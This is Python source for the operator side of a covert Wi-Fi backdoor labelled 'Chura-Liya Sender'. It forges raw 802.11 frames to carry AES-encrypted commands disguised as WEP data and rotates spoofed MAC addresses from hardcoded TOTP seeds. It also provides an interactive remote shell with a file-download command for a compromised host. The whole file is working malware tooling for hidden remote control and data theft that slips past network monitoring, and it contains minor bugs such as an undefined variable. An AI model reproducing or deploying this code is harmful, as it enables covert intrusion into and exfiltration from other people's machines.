#!/usr/bin/python
import datetime
from Queue import Queue,Empty
from threading import Thread,Lock
import zlib
from Crypto.Cipher import AES
from Crypto import Random
import logging
import base64
import sys,hashlib
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import argparse
from binascii import unhexlify,hexlify
from struct import unpack,pack
import pyotp

global recv
global long_msg
long_msg={}
long_msg['size']=0
global allowed_addr1
global allowed_addr2
global addr1
global addr2
allowed_addr1=[]
allowed_addr2=[]

recv=0
mutex = Lock()

MTU=1341


def lzpad(msg):
    while (len(msg)<4):
        msg="0"+msg
    return msg

def raw2pkt(msg):
    length = len(msg)
    pkts = length / MTU
    if (pkts > 48):
        #too long
        return False
    rem = length % MTU
    if (rem>0):
        pkts+=1
    parts=[msg[i:i+MTU] for i in range(0, len(msg), MTU)]
    i=0
    while (i<len(parts)):
        parts[i]=unhexlify(lzpad(hex(i+1).replace('0x','')))+unhexlify(lzpad(hex(pkts).replace('0x','')))+parts[i]
        i+=1
    return parts

def pkt2raw(p):
    load = p[4:]
    seq = int(hexlify(p[:2]),16)
    size = int(hexlify(p[2:4]),16)
#    print "seq:",seq
#    print "size:",size
#    print "load:",load
    return seq,size,load

def load_mac_prefixes(file):
    f = open(file,'r')
    data = f.readlines()
    f.close()
    i=0
    macs=[]
    for line in data:
        da=line.split(' ')
        mac=da[0].strip()
        vendor=da[1].strip()
        n=2
        mac_parts=[mac[i:i+n] for i in range(0, len(mac), n)]
        mac=':'.join(mac_parts)
        macs.append((mac.lower(),vendor))
    return macs


def pick_mac(n,macs):
    nhex=hex(int(n)).replace('0x','')
    index = int(n) & len(macs)-1
    mac,vendor = macs[index]
    existing='0123456789abcdef'
    suffix=nhex
    while (len(suffix)!=6):
        i=int(nhex,16) & len(existing)-1
        suffix=existing[i]+suffix
    suffix_parts=[suffix[i:i+2] for i in range(0,len(suffix),2)]
    suffix = ':'.join(suffix_parts)
    return (mac.lower()+":"+suffix,vendor)


def endSwap(value):
    """Takes an object and reverse Endians the bytes

    Useful for crc32 within 802.11:
    Autodetection logic built in for the following situations:
    Will take the stryng '0xaabbccdd' and return string '0xddccbbaa'
    Will take the integer 12345 and return integer 14640
    Will take the bytestream string of 'aabbccdd' and return string 'ddccbbaa'
    """
    try:
        value = hex(value).replace('0x', '')
        sType = 'int'
    except:
        if '0x' in value:
            sType = 'hStr'
        else:
            sType = 'bStr'
        value = value.replace('0x', '')
        
    start = 0
    end = 2
    swapList = []
    for i in range(len(value)/2):
        swapList.append(value[start:end])
        start += 2
        end += 2
    swapList.reverse()
    s = ''
    for i in swapList:
        s += i
    
    if sType == 'int':
        s = int(s, 16)
    elif sType == 'hStr':
        s = '0x' + s
    return s

def accepted_addrs(totp,timestamp,maclist):
    now=timestamp
    past=now - datetime.timedelta(seconds=30)
    future=now + datetime.timedelta(seconds=30)
    n1=totp.generate_otp(totp.timecode(now))
    n2=totp.generate_otp(totp.timecode(past))
    n3=totp.generate_otp(totp.timecode(future))
    mac1=pick_mac(n1,maclist)
    mac2=pick_mac(n2,maclist)
    mac3=pick_mac(n3,maclist)
    return [mac1,mac2,mac3]


# from https://www.coresecurity.com/system/files/publications/2016/05/psdos.py_.txt
# Copyright (c) 2009 Core Security Technologies
# Author: Leandro Meiners (lea@coresecurity.com)

def extractSN(sc):
    hexSC = '0' * (4 - len(hex(sc)[2:])) + hex(sc)[2:] # "normalize" to four digit hexadecimal number
    sn = int(hexSC[:-1], 16)
    return sn


def calculateSC(sn, fgnum = 0):
    if (fgnum > MAX_FGNUM): fgnum = 0
    if (sn > MAX_SN): sn = 0
    hexSN = hex(sn)[2:] + hex(fgnum)[2:]
    SC = int(hexSN, 16)
    return SC

def updateTOTP():
    s1="LOZHALKGVYVCTTEYCPAZCSZYX5N643LMUVQZGDQSAM2WKX4QN3VR4XDWEEFKNIBX"
    s2="SR3P2RLHYPH2L7CA3PGETDKYWYIVTUBW7YOATMWPOH6VVBVXBXG2BIQTKNU5GQGP"
    print s1
    print s2
    cmacsfile="clientmacs"
    smacsfile="servermacs"
    clientmacs=load_mac_prefixes(cmacsfile)
    servermacs=load_mac_prefixes(smacsfile)
    while 1:
        global allowed_addr1
        global allowed_addr2
        global addr1
        global addr2
        totp1 = pyotp.TOTP(s1)
        n1=totp1.now()
        totp2 = pyotp.TOTP(s2)
        n2=totp2.now()
        now=datetime.datetime.now()
        now_server=now - datetime.timedelta(days=30)
        t1=totp1.generate_otp(totp1.timecode(now))
        t2=totp2.generate_otp(totp2.timecode(now))
        this_addr1=accepted_addrs(totp1,now_server,clientmacs)
        this_addr2=accepted_addrs(totp2,now_server,servermacs)
        a1,vendor=pick_mac(t1,clientmacs)
        a2,vendor=pick_mac(t2,servermacs)
        i=0
        while (i<len(this_addr1)):
            mac,vendor=this_addr1[i]
            this_addr1[i]=mac
            i+=1
        i=0
        while (i<len(this_addr2)):
            mac,vendor=this_addr2[i]
            this_addr2[i]=mac
            i+=1
        if (set(this_addr1)!=set(allowed_addr1) and set(this_addr2)!=set(allowed_addr2)):
            mutex.acquire()
            addr1=a1
            addr2=a2
            allowed_addr1=this_addr1
            allowed_addr2=this_addr2
            mutex.release()
#            print "[*] OTP1:",n1
#            print "[*] OTP2:",n2
#            print "[*] Accepted ADDR1s:",this_addr1
#            print "[*] Accepted ADDR2s:",this_addr2
#            print "[*] Server ADDRs:",addr1,addr2
        time.sleep(1)

## Launcher options
parser = argparse.ArgumentParser(description='Chura-Liya Sender', prog='sender.py', usage='%(prog)s <Monitor Mode WiFi NIC> <Desired Password>')
parser.add_argument('Interface', type=str, help='WiFi NIC')
parser.add_argument('Password', type=str, help='Desired Password')

args = parser.parse_args()

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s : s[:-ord(s[len(s)-1:])]

class AESCipher:
    def __init__( self, key ):
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt( self, raw ):
        raw = pad(raw)
        iv = Random.new().read( AES.block_size )
        cipher = AES.new( self.key, AES.MODE_CBC, iv )
        return iv + cipher.encrypt( raw )

    def decrypt( self, enc ):
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv )
        return unpad(cipher.decrypt( enc[16:] ))


# extractSN/calculateSN from https://www.coresecurity.com/system/files/publications/2016/05/psdos.py_.txt
# Copyright (c) 2009 Core Security Technologies
# Author: Leandro Meiners (lea@coresecurity.com)

def extractSN(sc):
    hexSC = '0' * (4 - len(hex(sc)[2:])) + hex(sc)[2:] # "normalize" to four digit hexadecimal number
    sn = int(hexSC[:-1], 16)
    return sn

def calculateSC(sn, fgnum = 0):
    if (fgnum > MAX_FGNUM): fgnum = 0
    if (sn > MAX_SN): sn = 0
    hexSN = hex(sn)[2:] + hex(fgnum)[2:]
    SC = int(hexSN, 16)
    return SC


def build_rts(addr1,addr2):
    p = RadioTap(unhexlify('000012002e48000000307109c000ef010000'))
    dot11 = Dot11(subtype=11L, type=1L, addr1=addr1, addr2=addr2)
    return p/dot11

def build_cts(addr1,addr2):
    p = RadioTap(unhexlify('000012002e48000000307109c000ef010000'))
    dot11 = Dot11(subtype=12L, type=1L, addr1=addr1, addr2=addr2)
    return p/dot11

def build_block_ack(addr1,addr2,seq):
    p = RadioTap(unhexlify('000012002e48000000307109c000ef010000'))
    dot11 = Dot11(subtype=13L, type=1L, addr1=addr2)
    raw = Padding(load=unhexlify(addr1.replace(':',''))+unhexlify('0500')+endSwap(seq)+unhexlify("ffffffffffffffff"))
    return p/dot11/raw

def build_ack(addr1):
    p = RadioTap(unhexlify('000012002e48000000307109c000ef010000'))
    dot11 = Dot11(subtype=13L, type=1L, addr1=addr1)
    return p/dot11

def build_pkt(addr1,addr2,msg,retry=False):
    rates = aes.encrypt(msg)
    mode="00"
    payload=rates
    p = RadioTap('\x00\x00$\x00/@\x00\xa0 \x08\x00\x00\x00\x00\x00\x00\x89\xf7\xaf\x1f\x9a\x00\x00\x00\x10\x02l\t\xa0\x00\xa5\x00\x00\x00\xa5\x00')
    dot11 = Dot11(subtype=8L, type=2L, FCfield=65L,addr1=addr1,addr2=addr2,addr3=addr1)

    dot11wep = Dot11WEP(iv="\x00\x10\x01",keyid=32,wepdata=payload)
    p = p/dot11/Dot11QoS("\x00\x00")/dot11wep
    if (not retry):
        global sn
        sn = (sn + 1) % MAX_SN
    sc = calculateSC(sn)        # our frame is not fragmented (i.e. fgnum = 0)
    p[Dot11].SC=sc

    ### Heres the FCS kung-fu for WPA
    del p[Dot11WEP].icv
    try:
        pktstr=str(p[Dot11])
        try:
            hex_crc=hex(crc32(pktstr) & 0xffffffff).lstrip('0x').rstrip('L')
            while (len(hex_crc)!=8):
                hex_crc='0'+hex_crc
            try:
                crc_bigend = endSwap(hex_crc)
                try:
            	    p = p/Padding(load = unhexlify(crc_bigend))
                except Exception, e:
                    print "unhexlify():",str(e)
            except Exception, e:
                print "endswap():",str(e)
        except Exception, e:
            print "hex_crc:",str(e)
    except Exception, e:
        print "pktstr:",str(e)
        exit()
    return p


interface=args.Interface
password=args.Password
verbose=0
aes=AESCipher(password)

conf.verbose=verbose
conf.iface=interface
ssid=""
global msg,msglen
msg=""
msglen=0
MALGN="0C:F0:19"
addr1="a4:71:74:10:1f:29".lower()
addr1=""
addr2="24:5B:A7:52:1E:DE".lower()
ack = build_ack(addr2)

def convert(pkt_hex):
    last_4 = unpack('!I',pkt_hex[-4:])[0]
    # getting last 4 bytes and converting it to integer

    rest = pkt_hex[:-4]
    # getting whole packet in string except last 4 bytes

    new_hex_pkt = rest + pack('>I',(last_4+1))
    # created the whole packet again with last 4 bytes incremented by 1
    # the new string is like '\x00\x04\x00 ... ... \x06k' <--- NOTE: 'j' was incremented to 'k' (rather than ']' to '^')

    return IP(new_hex_pkt) # <--- NOTE: rebuild the packet and recalculate its checksum

global gotcts
gotcts=0
def wait_cts(pkt):
    if pkt.addr1 == addr2:
        print "[*] Got CTS"
        print pkt.addr1
        global gotcts
        gotcts=1
        return True
    return False

global sn
MAX_SN=4096
MAX_FGNUM=16
sn = random.randint(0,4095)
fgnum = 0
global w4ack
w4ack=0
global rts
rts=0
global w4cts
w4cts=False
global rcts
rcts=False
global filedownload
filedownload=False

def sniffProbe(pkt):
    global rts
    global recv
    global rcts
    global w4ack
    global w4cts
    global long_msg
    global filedownload
    if pkt.haslayer(Dot11):
        if pkt.addr1 in allowed_addr2 and pkt.addr2 in allowed_addr1:
            if pkt[Dot11].type == 1 and pkt[Dot11].subtype == 11: # if RTS
                if (rts):
                    return False
                pkt = build_cts(addr2,addr1)
                sendp(pkt,iface=interface,count=1)
                mutex.acquire()
                rts=1
                mutex.release()
                return False
            if pkt.haslayer(Dot11WEP):
                if pkt[Dot11].type == 2 and pkt[Dot11].subtype == 8: # if management frame and beacon and SSID is blank
                    payload=pkt[Dot11WEP].wepdata
                    icv=pkt[Dot11WEP].iv
                    try:
                        decrypted = aes.decrypt(payload)
                    except ValueError:
                        try:
                            decrypted = aes.decrypt(payload[:-4])
                        except:
                             return False
                    except:
                        return False
                    seq,size,load=pkt2raw(decrypted)
                    if (seq==1 and size==1):
                        mutex.acquire()
                        ack=build_ack(addr1)
                        sendp(ack,iface=interface,verbose=0)
                        recv=load
                        mutex.release()
                        return True
                    if (str(seq) in long_msg):
                        return True
                    if (filedownload):
                        print "[*] Got",seq,"/",size
                    if (seq==1):
                        mutex.acquire()
                        long_msg['size']=size
                        mutex.release()
                    if (seq!=size):
                        mutex.acquire()
                        long_msg[str(seq)]=load
                        ack=build_ack(addr1)
                        sendp(ack,iface=interface,verbose=0)
                        mutex.release()
                    else:
                        if ('size' not in long_msg):
                            return True
                        ack=build_ack(addr1)
                        sendp(ack,iface=interface,verbose=0)
                        mutex.acquire()
                        long_msg[str(seq)]=load
                        i=1
                        decrypted=""
                        while (i<=long_msg['size']):
                            try:
                                decrypted+=long_msg[str(i)]
                            except:
                                print "[-] part missing:",i
                            i+=1
                        recv=decrypted
                        long_msg={}
                        mutex.release()
                    return True
        if (w4ack):
            if pkt[Dot11].type == 1 and pkt[Dot11].subtype == 13 and pkt.addr1 in allowed_addr2: # if ACK
                if (mutex.acquire(False)):
                    w4ack=0
                    mutex.release()




def SendRates(cmd,retry=False):
    if (len(cmd)>1434):
        frames = sendlong(cmd)
        return frames
    frame = build_pkt(addr1,addr2,cmd,retry)
    return frame


def hs(q):
    sniff(iface=interface,prn=lambda x: q.put(x),store=0)


def process(q):
    while(True):
        try:
            pkt = q.get(timeout=1)
            sniffProbe(pkt)
            q.task_done()
        except Empty:
            pass

def s1p(cmd):
    global w4cts,rcts,recv,w4ack
    pkt=SendRates(cmd)
    mutex.acquire()
    recv=0
    w4ack=1
    mutex.release()
    sendp(pkt,iface=conf.iface,verbose=0)
    timeout=3
    retry=1
    t=0
    while (w4ack == 1):
        if (t==timeout):
            retry-=1
            t=0
            pkt=SendRates(cmd,retry=1)
            sendp(pkt,iface=conf.iface,verbose=0)
        time.sleep(0.5)
        t+=0.5
    while (recv == 0):
        pass
    reply=recv.strip()
    mutex.acquire()
    recv=0
    mutex.release()
    return reply

def threaded_sniff():
    while (addr1==""):
        time.sleep(0.5)
    print "hello"
    q = Queue()
    sniffer = Thread(target=hs,args=(q,))
    sniffer.daemon = True
    sniffer.start()
    proc = Thread(target=process,args=(q,))
    proc.daemon = True
    proc.start()
    username=s1p("whoami")
    hostname=s1p("hostname")
    cwd = s1p("pwd")
    if (username=="root"):
        prompt=username+"@"+hostname+":"+cwd+"# "
    else:
        prompt=username+"@"+hostname+":"+cwd+"$ "
    recv=0
    while (True):
        cmd = raw_input(prompt)
        if (cmd.lower()=="exit"):
            exit()
        elif (cmd.startswith("download")):
            global filedownload
            mutex.acquire()
            filedownload=True
            mutex.release()
            filename = cmd.split("download")[1].strip()
            output = filename.split("/")
            outfile = output[len(output)-1]
            data = s1p(cmd).strip()
            f = open(outfile,'w')
            f.write(data)
            f.close()
            print "[+]",filename,"downloaded successfully."
            mutex.acquire()
            filedownload=False
            mutex.release()
        else:
            print s1p(cmd).strip()
    exit()

def len2hex(plen):
    h = hex(plen).replace('0x','')
    i=6
    while (len(h)<i):
        h="0"+h
    return str(unhexlify(h))


def decode_length(iv):
    hiv = hexlify(iv)
    m = hix[0:2]
    s = hix[3:]
    return int(m,16),int(s,16)

def encode_length(msg,size):
    if (msg > 4095 or size > 4095):
        print "[!] Message to big!"
        return -1

    m = hex(msg).replace('0x','')
    s = hex(size).replace('0x','')
    i=3
    while (len(m)<i):
        m="0"+m
    while (len(s)<i):
        s="0"+s
    return str(unhexlify(m+s))

totp_t = Thread(target=updateTOTP)
totp_t.daemon = True
totp_t.start()
    
print "------ Out-of-Band Backdoor ------"
print "[*] Connecting..."
threaded_sniff()
exit()
